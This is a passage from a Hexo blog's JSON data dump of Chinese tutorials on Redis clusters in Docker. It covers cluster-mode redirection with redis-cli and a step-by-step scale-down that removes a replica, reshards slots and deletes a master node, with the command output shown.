class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/data<span class=\"comment\"># redis-cli -p 6381</span></span><br><span class=\"line\">127.0.0.1:6381&gt; keys *</span><br><span class=\"line\">(empty array)</span><br><span class=\"line\">127.0.0.1:6381&gt; <span class=\"built_in\">set</span> k1 v1</span><br><span class=\"line\">(error) MOVED 12706 192.168.1.42:6383</span><br><span class=\"line\">127.0.0.1:6381&gt; <span class=\"built_in\">set</span> k2 v2</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6381&gt; <span class=\"built_in\">set</span> k3 v3</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6381&gt; <span class=\"built_in\">set</span> k4 v4</span><br><span class=\"line\">(error) MOVED 8455 192.168.1.42:6382</span><br><span class=\"line\">127.0.0.1:6381&gt; </span><br></pre></td></tr></table></figure>","more":"<p>可以发现使用<code>redis-cli -p 6381</code>命令进入单节点的容器，存在部分数据无法存储的情况（k2,k3存储成功，k1,k4存储失败），正确的进入方式应该是进入集群，然后进行数据的存储。</p>\n<p>正确演示：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6381&gt; <span class=\"built_in\">exit</span></span><br><span class=\"line\">root@knight:/data<span class=\"comment\"># redis-cli -p 6381 -c</span></span><br><span class=\"line\">127.0.0.1:6381&gt; FLUSHALL</span><br><span class=\"line\">OK</span><br><span class=\"line\">127.0.0.1:6381&gt; <span class=\"built_in\">set</span> k1 v1</span><br><span class=\"line\">-&gt; Redirected to slot [12706] located at 192.168.1.42:6383</span><br><span class=\"line\">OK</span><br><span class=\"line\">192.168.1.42:6383&gt; <span class=\"built_in\">set</span> k4 v4</span><br><span class=\"line\">-&gt; Redirected to slot [8455] located at 192.168.1.42:6382</span><br><span class=\"line\">OK</span><br><span class=\"line\">192.168.1.42:6382&gt; </span><br></pre></td></tr></table></figure>\n\n<p>退出后重新进入，清空所有的数据，重新插入之前插入失败的数据，可以插入了，并且可以发现之所以可以成功插入数据，是因为系统将数据重定向到了应该插入的机器上（注意端口号的变化）。</p>"},{"title":"Redis缩容案例","date":"2023-08-14T12:27:08.000Z","_content":"\n### 操作步骤\n\n要实现Redis缩容，例如移除6387的主机，首先需要把6388的Slave主机移除，然后归还槽位，最后再移除Master主机。\n\n1. 首先查看集群信息\n\n```bash\nredis-cli --cluster check 192.168.1.42:6381\n```\n\n<!-- more -->\n\n效果：\n\n```bash 折叠代码\nS: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381\n   slots: (0 slots) slave\n   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0\nM: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386\n   slots:[1365-5460] (4096 slots) master\n   1 additional replica(s)\nS: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385\n   slots: (0 slots) slave\n   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40\nS: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384\n   slots: (0 slots) slave\n   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda\nM: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382\n   slots:[6827-10922] (4096 slots) master\n   1 additional replica(s)\nS: 8758dde1064a8fd6aacbc15dfd90d3ca4545cc73 192.168.1.42:6388\n   slots: (0 slots) slave\n   replicates 791172307abf9223425af595e661cec441951170\nM: 791172307abf9223425af595e661cec441951170 192.168.1.42:6387\n   slots:[0-1364],[5461-6826],[10923-12287] (4096 slots) master\n   1 additional replica(s)\nM: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383\n   slots:[12288-16383] (4096 slots) master\n   1 additional replica(s)\n```\n\n2. 移除6388Slave主机\n\n```bash\nredis-cli --cluster del-node 192.168.1.42:6388 8758dde1064a8fd6aacbc15dfd90d3ca4545cc73\n```\n\n效果：\n\n```bash\nroot@knight:/data# redis-cli --cluster del-node 192.168.1.42:6388 8758dde1064a8fd6aacbc15dfd90d3ca4545cc73\n>>> Removing node 8758dde1064a8fd6aacbc15dfd90d3ca4545cc73 from cluster 192.168.1.42:6388\n>>> Sending CLUSTER FORGET messages to the cluster...\n>>> Sending CLUSTER RESET SOFT to the deleted node.\n```\n\n3. 再次查看集群的状态信息\n\n```bash\nredis-cli --cluster check 192.168.1.42:6381\n```\n\n效果：\n\n```bash 折叠代码\nS: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381\n   slots: (0 slots) slave\n   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0\nM: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386\n   slots:[1365-5460] (4096 slots) master\n   1 additional replica(s)\nS: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385\n   slots: (0 slots) slave\n   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40\nS: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384\n   slots: (0 slots) slave\n   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda\nM: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382\n   slots:[6827-10922] (4096 slots) master\n   1 additional replica(s)\nM: 791172307abf9223425af595e661cec441951170 192.168.1.42:6387\n   slots:[0-1364],[5461-6826],[10923-12287] (4096 slots) master\nM: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383\n   slots:[12288-16383] (4096 slots) master\n   1 additional replica(s)\n```\n\n可以看到只有3个Slave主机了。\n\n4. 重新分配槽号\n\n```bash\nredis-cli --cluster reshard 192.168.1.42:6381\n```\n\n要删除的是6387的Master主机，要把6387拥有的槽号统一分配给6386的Master主机，按照下图的指示进行操作：\n\n![重新分配槽号](./RedisDel/1.png)\n\n5. 稍作等待，待槽号重新分配完成，查看集群节点的槽号信息\n\n```bash\nredis-cli --cluster check 192.168.1.42:6381\n```\n\n效果：\n\n```bash\nroot@knight:/data# redis-cli --cluster check 192.168.1.42:6381\n192.168.1.42:6386 (849a82f0...) -> 0 keys | 8192 slots | 1 slaves.\n192.168.1.42:6382 (6dca8499...) -> 1 keys | 4096 slots | 1 slaves.\n192.168.1.42:6387 (79117230...) -> 0 keys | 0 slots | 0 slaves.\n192.168.1.42:6383 (41f99f51...) -> 1 keys | 4096 slots | 1 slaves.\n```\n\n可以看到6387的主机已经没有任何槽号了，而6386主机比其他两个Master节点多出来4096个槽号。\n\n5. 从集群删除6387节点\n\n```bash\nredis-cli --cluster del-node 192.168.1.42:6387 791172307abf9223425af595e661cec441951170\n```\n\n效果：\n\n```bash\nroot@knight:/data# redis-cli --cluster del-node 192.168.1.42:6387 791172307abf9223425af595e661cec441951170\n>>> Removing node 791172307abf9223425af595e661cec441951170 from cluster 192.168.1.42:6387\n>>> Sending CLUSTER FORGET messages to the cluster...\n>>> Sending CLUSTER RESET SOFT to the deleted node.\n```\n\n6. 再次查看集群节点信息\n\n```bash\nredis-cli --cluster check 192.168.1.42:6381\n```\n\n效果：\n\n```bash 折叠代码\nS: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381\n   slots: (0 slots) slave\n   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0\nM: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386\n   slots:[0-6826],[10923-12287] (8192 slots) master\n   1 additional replica(s)\nS: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385\n   slots: (0 slots) slave\n   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40\nS: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384\n   slots: (0 slots) slave\n   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda\nM: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382\n   slots:[6827-10922] (4096 slots) master\n   1 additional replica(s)\nM: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383\n   slots:[12288-16383] (4096 slots) master\n   1 additional replica(s)\n```\n\n可以看到集群又恢复到3主3从的节点状态。","source":"_posts/RedisDel.md","raw":"---\ntitle: Redis缩容案例\ndate: 2023-08-14 20:27:08\ncategories: 技术\ntags:\n  - Docker\n  - Redis\n---\n\n### 操作步骤\n\n要实现Redis缩容，例如移除6387的主机，首先需要把6388的Slave主机移除，然后归还槽位，最后再移除Master主机。\n\n1. 首先查看集群信息\n\n```bash\nredis-cli --cluster check 192.168.1.42:6381\n```\n\n<!-- more -->\n\n效果：\n\n```bash 折叠代码\nS: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381\n   slots: (0 slots) slave\n   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0\nM: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386\n   slots:[1365-5460] (4096 slots) master\n   1 additional replica(s)\nS: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385\n   slots: (0 slots) slave\n   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40\nS: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384\n   slots: (0 slots) slave\n   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda\nM: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382\n   slots:[6827-10922] (4096 slots) master\n   1 additional replica(s)\nS: 8758dde1064a8fd6aacbc15dfd90d3ca4545cc73 192.168.1.42:6388\n   slots: (0 slots) slave\n   replicates 791172307abf9223425af595e661cec441951170\nM: 791172307abf9223425af595e661cec441951170 192.168.1.42:6387\n   slots:[0-1364],[5461-6826],[10923-12287] (4096 slots) master\n   1 additional replica(s)\nM: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383\n   slots:[12288-16383] (4096 slots) master\n   1 additional replica(s)\n```\n\n2. 移除6388Slave主机\n\n```bash\nredis-cli --cluster del-node 192.168.1.42:6388 8758dde1064a8fd6aacbc15dfd90d3ca4545cc73\n```\n\n效果：\n\n```bash\nroot@knight:/data# redis-cli --cluster del-node 192.168.1.42:6388 8758dde1064a8fd6aacbc15dfd90d3ca4545cc73\n>>> Removing node 8758dde1064a8fd6aacbc15dfd90d3ca4545cc73 from cluster 192.168.1.42:6388\n>>> Sending CLUSTER FORGET messages to the cluster...\n>>> Sending CLUSTER RESET SOFT to the deleted node.\n```\n\n3. 再次查看集群的状态信息\n\n```bash\nredis-cli --cluster check 192.168.1.42:6381\n```\n\n效果：\n\n```bash 折叠代码\nS: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381\n   slots: (0 slots) slave\n   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0\nM: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386\n   slots:[1365-5460] (4096 slots) master\n   1 additional replica(s)\nS: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385\n   slots: (0 slots) slave\n   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40\nS: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384\n   slots: (0 slots) slave\n   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda\nM: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382\n   slots:[6827-10922] (4096 slots) master\n   1 additional replica(s)\nM: 791172307abf9223425af595e661cec441951170 192.168.1.42:6387\n   slots:[0-1364],[5461-6826],[10923-12287] (4096 slots) master\nM: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383\n   slots:[12288-16383] (4096 slots) master\n   1 additional replica(s)\n```\n\n可以看到只有3个Slave主机了。\n\n4. 重新分配槽号\n\n```bash\nredis-cli --cluster reshard 192.168.1.42:6381\n```\n\n要删除的是6387的Master主机，要把6387拥有的槽号统一分配给6386的Master主机，按照下图的指示进行操作：\n\n![重新分配槽号](./RedisDel/1.png)\n\n5. 稍作等待，待槽号重新分配完成，查看集群节点的槽号信息\n\n```bash\nredis-cli --cluster check 192.168.1.42:6381\n```\n\n效果：\n\n```bash\nroot@knight:/data# redis-cli --cluster check 192.168.1.42:6381\n192.168.1.42:6386 (849a82f0...) -> 0 keys | 8192 slots | 1 slaves.\n192.168.1.42:6382 (6dca8499...) -> 1 keys | 4096 slots | 1 slaves.\n192.168.1.42:6387 (79117230...) -> 0 keys | 0 slots | 0 slaves.\n192.168.1.42:6383 (41f99f51...) -> 1 keys | 4096 slots | 1 slaves.\n```\n\n可以看到6387的主机已经没有任何槽号了，而6386主机比其他两个Master节点多出来4096个槽号。\n\n5. 从集群删除6387节点\n\n```bash\nredis-cli --cluster del-node 192.168.1.42:6387 791172307abf9223425af595e661cec441951170\n```\n\n效果：\n\n```bash\nroot@knight:/data# redis-cli --cluster del-node 192.168.1.42:6387 791172307abf9223425af595e661cec441951170\n>>> Removing node 791172307abf9223425af595e661cec441951170 from cluster 192.168.1.42:6387\n>>> Sending CLUSTER FORGET messages to the cluster...\n>>> Sending CLUSTER RESET SOFT to the deleted node.\n```\n\n6. 再次查看集群节点信息\n\n```bash\nredis-cli --cluster check 192.168.1.42:6381\n```\n\n效果：\n\n```bash 折叠代码\nS: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381\n   slots: (0 slots) slave\n   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0\nM: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386\n   slots:[0-6826],[10923-12287] (8192 slots) master\n   1 additional replica(s)\nS: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385\n   slots: (0 slots) slave\n   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40\nS: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384\n   slots: (0 slots) slave\n   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda\nM: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382\n   slots:[6827-10922] (4096 slots) master\n   1 additional replica(s)\nM: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383\n   slots:[12288-16383] (4096 slots) master\n   1 additional replica(s)\n```\n\n可以看到集群又恢复到3主3从的节点状态。","slug":"RedisDel","published":1,"updated":"2024-05-03T03:55:54.829Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5ek003m7zj3azzs1wgw","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"操作步骤\"><a href=\"#操作步骤\" class=\"headerlink\" title=\"操作步骤\"></a>操作步骤</h3><p>要实现Redis缩容，例如移除6387的主机，首先需要把6388的Slave主机移除，然后归还槽位，最后再移除Master主机。</p>\n<ol>\n<li>首先查看集群信息</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli --cluster check 192.168.1.42:6381</span><br></pre></td></tr></table></figure>\n\n<span id=\"more\"></span>\n\n<p>效果：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">S: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0</span><br><span class=\"line\">M: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386</span><br><span class=\"line\">   slots:[1365-5460] (4096 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br><span class=\"line\">S: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40</span><br><span class=\"line\">S: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda</span><br><span class=\"line\">M: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382</span><br><span class=\"line\">   slots:[6827-10922] (4096 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br><span class=\"line\">S: 8758dde1064a8fd6aacbc15dfd90d3ca4545cc73 192.168.1.42:6388</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 791172307abf9223425af595e661cec441951170</span><br><span class=\"line\">M: 791172307abf9223425af595e661cec441951170 192.168.1.42:6387</span><br><span class=\"line\">   slots:[0-1364],[5461-6826],[10923-12287] (4096 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br><span class=\"line\">M: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383</span><br><span class=\"line\">   slots:[12288-16383] (4096 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>移除6388Slave主机</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli --cluster del-node 192.168.1.42:6388 8758dde1064a8fd6aacbc15dfd90d3ca4545cc73</span><br></pre></td></tr></table></figure>\n\n<p>效果：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/data<span class=\"comment\"># redis-cli --cluster del-node 192.168.1.42:6388 8758dde1064a8fd6aacbc15dfd90d3ca4545cc73</span></span><br><span class=\"line\">&gt;&gt;&gt; Removing node 8758dde1064a8fd6aacbc15dfd90d3ca4545cc73 from cluster 192.168.1.42:6388</span><br><span class=\"line\">&gt;&gt;&gt; Sending CLUSTER FORGET messages to the cluster...</span><br><span class=\"line\">&gt;&gt;&gt; Sending CLUSTER RESET SOFT to the deleted node.</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>再次查看集群的状态信息</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli --cluster check 192.168.1.42:6381</span><br></pre></td></tr></table></figure>\n\n<p>效果：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">S: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0</span><br><span class=\"line\">M: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386</span><br><span class=\"line\">   slots:[1365-5460] (4096 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br><span class=\"line\">S: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40</span><br><span class=\"line\">S: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda</span><br><span class=\"line\">M: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382</span><br><span class=\"line\">   slots:[6827-10922] (4096 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br><span class=\"line\">M: 791172307abf9223425af595e661cec441951170 192.168.1.42:6387</span><br><span class=\"line\">   slots:[0-1364],[5461-6826],[10923-12287] (4096 slots) master</span><br><span class=\"line\">M: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383</span><br><span class=\"line\">   slots:[12288-16383] (4096 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br></pre></td></tr></table></figure>\n\n<p>可以看到只有3个Slave主机了。</p>\n<ol start=\"4\">\n<li>重新分配槽号</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli --cluster reshard 192.168.1.42:6381</span><br></pre></td></tr></table></figure>\n\n<p>要删除的是6387的Master主机，要把6387拥有的槽号统一分配给6386的Master主机，按照下图的指示进行操作：</p>\n<p><img src=\"/2023/08/14/RedisDel/1.png\" alt=\"重新分配槽号\"></p>\n<ol start=\"5\">\n<li>稍作等待，待槽号重新分配完成，查看集群节点的槽号信息</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli --cluster check 192.168.1.42:6381</span><br></pre></td></tr></table></figure>\n\n<p>效果：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/data<span class=\"comment\"># redis-cli --cluster check 192.168.1.42:6381</span></span><br><span class=\"line\">192.168.1.42:6386 (849a82f0...) -&gt; 0 keys | 8192 slots | 1 slaves.</span><br><span class=\"line\">192.168.1.42:6382 (6dca8499...) -&gt; 1 keys | 4096 slots | 1 slaves.</span><br><span class=\"line\">192.168.1.42:6387 (79117230...) -&gt; 0 keys | 0 slots | 0 slaves.</span><br><span class=\"line\">192.168.1.42:6383 (41f99f51...) -&gt; 1 keys | 4096 slots | 1 slaves.</span><br></pre></td></tr></table></figure>\n\n<p>可以看到6387的主机已经没有任何槽号了，而6386主机比其他两个Master节点多出来4096个槽号。</p>\n<ol start=\"5\">\n<li>从集群删除6387节点</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli --cluster del-node 192.168.1.42:6387 791172307abf9223425af595e661cec441951170</span><br></pre></td></tr></table></figure>\n\n<p>效果：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@knight:/data<span class=\"comment\"># redis-cli --cluster del-node 192.168.1.42:6387 791172307abf9223425af595e661cec441951170</span></span><br><span class=\"line\">&gt;&gt;&gt; Removing node 791172307abf9223425af595e661cec441951170 from cluster 192.168.1.42:6387</span><br><span class=\"line\">&gt;&gt;&gt; Sending CLUSTER FORGET messages to the cluster...</span><br><span class=\"line\">&gt;&gt;&gt; Sending CLUSTER RESET SOFT to the deleted node.</span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li>再次查看集群节点信息</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli --cluster check 192.168.1.42:6381</span><br></pre></td></tr></table></figure>\n\n<p>效果：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">S: f999e35136ec2e61fcceebf182f5c38ef4a4354d 192.168.1.42:6381</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 849a82f0bd85238762ca7ccf234aa30ba97d93a0</span><br><span class=\"line\">M: 849a82f0bd85238762ca7ccf234aa30ba97d93a0 192.168.1.42:6386</span><br><span class=\"line\">   slots:[0-6826],[10923-12287] (8192 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br><span class=\"line\">S: 9f55acb1e18b1dfa53ad3a4a506ff2512a92cb46 192.168.1.42:6385</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40</span><br><span class=\"line\">S: 8e70d538b699c96edc3f6608224aa8ecf55d857b 192.168.1.42:6384</span><br><span class=\"line\">   slots: (0 slots) slave</span><br><span class=\"line\">   replicates 6dca84998e245ce4cc6c92882fb7ac94d501efda</span><br><span class=\"line\">M: 6dca84998e245ce4cc6c92882fb7ac94d501efda 192.168.1.42:6382</span><br><span class=\"line\">   slots:[6827-10922] (4096 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br><span class=\"line\">M: 41f99f5142b5c4b7e1e17c8a94e88fc74cda4d40 192.168.1.42:6383</span><br><span class=\"line\">   slots:[12288-16383] (4096 slots) master</span><br><span class=\"line\">   1 additional replica(s)</span><br></pre></td></tr></table></figure>\n\n<p>可以看到集群又恢复到3主3从的节点状态。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          